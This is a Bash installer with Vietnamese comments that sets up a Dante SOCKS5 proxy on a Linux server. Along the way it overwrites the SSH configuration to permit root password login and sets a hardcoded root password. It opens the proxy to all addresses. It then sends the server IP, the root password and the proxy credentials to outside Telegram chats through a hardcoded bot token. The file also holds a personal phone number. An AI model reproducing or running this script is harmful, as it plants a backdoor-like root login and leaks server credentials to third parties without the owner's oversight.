#!/bin/bash

# === CẤU HÌNH SSH CHO PHÉP ĐĂNG NHẬP BẰNG MẬT KHẨU ===
rm -f /etc/ssh/sshd_config

cat <<EOF > /etc/ssh/sshd_config
Port 22
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
Subsystem sftp /usr/lib/openssh/sftp-server
EOF

PASS="Tubanvps123@"
echo "root:$PASS" | chpasswd

systemctl restart ssh
systemctl restart sshd

# === CÀI GÓI CẦN THIẾT ===
if [ -f /etc/debian_version ]; then
  apt update -y
  apt install -y gcc make wget tar firewalld curl iproute2
else
  yum update -y
  yum install -y gcc make wget tar firewalld curl
fi

# === CÀI DANTE SOCKS5 ===
cd /root
wget https://www.inet.no/dante/files/dante-1.4.2.tar.gz
tar -xvzf dante-1.4.2.tar.gz
cd dante-1.4.2
./configure
make
make install

# === LẤY INTERFACE VÀ IP ===
EXT_IF=$(ip -o -4 route show to default | awk '{print $5}')
IP=$(curl -s ifconfig.me)

# === RANDOM PORT VÀ PASSWORD ===
PORT=$(shuf -i 20000-60000 -n 1)
PASS_SOCKS=$(tr -dc A-Za-z0-9 </dev/urandom | head -c12)
USER=anhtu

# === TẠO USER SOCKS5 ===
id "$USER" &>/dev/null || useradd "$USER"
echo "$USER:$PASS_SOCKS" | chpasswd

# === CẤU HÌNH DANTE ===
cat > /etc/sockd.conf <<EOF
logoutput: /var/log/sockd.log
internal: 0.0.0.0 port = $PORT
external: $EXT_IF
method: username
user.notprivileged: nobody

client pass {
  from: 0.0.0.0/0 to: 0.0.0.0/0
  log: connect disconnect error
}

socks pass {
  from: 0.0.0.0/0 to: 0.0.0.0/0
  command: connect
  log: connect disconnect error
  method: username
}
EOF

# === MỞ PORT FIREWALL ===
if command -v firewall-cmd >/dev/null 2>&1; then
  systemctl start firewalld
  firewall-cmd --permanent --add-port=${PORT}/tcp
  firewall-cmd --reload
else
  iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT
fi

# === TẠO SYSTEMD SERVICE CHO DANTE ===
cat > /etc/systemd/system/sockd.service <<EOF
[Unit]
Description=Dante SOCKS5 Proxy
After=network.target

[Service]
ExecStart=/usr/local/sbin/sockd -f /etc/sockd.conf
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

# === KHỞI ĐỘNG DANTE ===
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable sockd
systemctl restart sockd

# === KIỂM TRA TỐC ĐỘ PROXY ===
SPEED=$(curl -x socks5h://$USER:$PASS_SOCKS@$IP:$PORT -o /dev/null -s -w "%{time_total}" http://ifconfig.me)
PING_RESULT=$(ping -c 3 $IP | tail -2 | head -1 | awk -F '/' '{print $5 " ms"}')

# === BOT TELEGRAM CẤU HÌNH ===
BOT_TOKEN="7661562599:AAG5AvXpwl87M5up34-nj9AvMiJu-jYuWlA"
ADMIN_CHAT_ID="7051936083"
GROUP_CHAT_ID="-1002322055133"

# === TIN ĐẦY ĐỦ GỬI ADMIN ===
MESSAGE="🎯 SOCKS5 Proxy   SSH Ready!
➡️ Proxy: $IP:$PORT:$USER:$PASS_SOCKS

🔐 SSH root login:
User: root
Pass: $PASS

⏱ Proxy tốc độ: $SPEED s
📶 Ping: $PING_RESULT

📥 SSH từ CMD:
ssh root@$IP

Tạo Proxy Thành Công - Bot By Phạm Anh Tú
Zalo: 0326615531"

# === TIN NGẮN GỬI NHÓM ===
SHORT_MSG="$IP:$PORT:$USER:$PASS_SOCKS"

# === GỬI VỀ NHÓM (IP:PORT:USER:PASS) ===
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d chat_id="$GROUP_CHAT_ID" \
  -d text="$SHORT_MSG"

# === GỬI VỀ ADMIN (FULL INFO) ===
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d chat_id="$ADMIN_CHAT_ID" \
  -d text="$MESSAGE"

echo "✅ Proxy + SSH đã tạo, gửi về admin & nhóm Telegram!"
